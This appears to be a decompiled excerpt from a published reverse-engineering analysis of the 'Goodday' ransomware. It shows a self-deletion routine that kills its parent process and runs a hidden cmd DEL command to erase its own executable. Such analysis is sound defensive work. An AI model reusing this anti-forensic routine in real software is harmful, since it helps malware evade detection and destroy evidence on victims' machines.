////////////////////////////////////////////////////////////
// Goodday Ransomware
// https://www.shadowstackre.com/analysis/Goodday
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////
BOOL DeleteSelfFromDisk()
{
  const WCHAR *FileNameW; // eax
  WCHAR Filename[260]; // [esp+0h] [ebp-64Ch] BYREF
  PROCESSENTRY32W pe; // [esp+208h] [ebp-444h] BYREF
  WCHAR String1[260]; // [esp+434h] [ebp-218h] BYREF
  int v5; // [esp+63Ch] [ebp-10h]
  DWORD CurrentProcessId; // [esp+640h] [ebp-Ch]
  HANDLE hSnapshot; // [esp+644h] [ebp-8h]
  HANDLE hProcess; // [esp+648h] [ebp-4h]

  hProcess = 0;
  CurrentProcessId = GetCurrentProcessId();
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  pe.dwSize = 556;
  if ( Process32FirstW(hSnapshot, &pe) )
  {
    while ( 1 )
    {
      if ( pe.th32ProcessID == CurrentProcessId )
      {
        hProcess = OpenProcess(0x411u, 0, pe.th32ParentProcessID);
        if ( hProcess )
          break;
      }
      if ( !Process32NextW(hSnapshot, &pe) )
        goto LABEL_11;
    }
    sub_4175C0(Filename, 260);
    if ( K32GetModuleFileNameExW(hProcess, 0, Filename, 0x104u) )
    {
      lstrcatW(String1, aCTimeoutT2NulS);       // /c TIMEOUT /T 2>NUL&START /b "" cmd /c DEL "
      lstrcatW(String1, Filename);
      FileNameW = PathFindFileNameW(Filename);
      v5 = lstrcmpW(FileNameW, aExplorerExe);
      if ( !v5 )
      {
        lstrcatW(String1, aDel);
        lstrcatW(String1, pe.szExeFile);
      }
      lstrcatW(String1, aExit_0);
      ShellExecuteW(0, aOpen_1, aCmdExe_1, String1, 0, 0);
      TerminateProcess(hProcess, 9u);
      DeleteFileW(Filename);
      if ( !v5 )
      {
        CloseHandle(hProcess);
        CloseHandle(hSnapshot);
        ExitProcess(0);
      }
    }
    CloseHandle(hProcess);
    return CloseHandle(hSnapshot);
  }
  else
  {
LABEL_11:
    CloseHandle(hProcess);
    return CloseHandle(hSnapshot);
  }
}
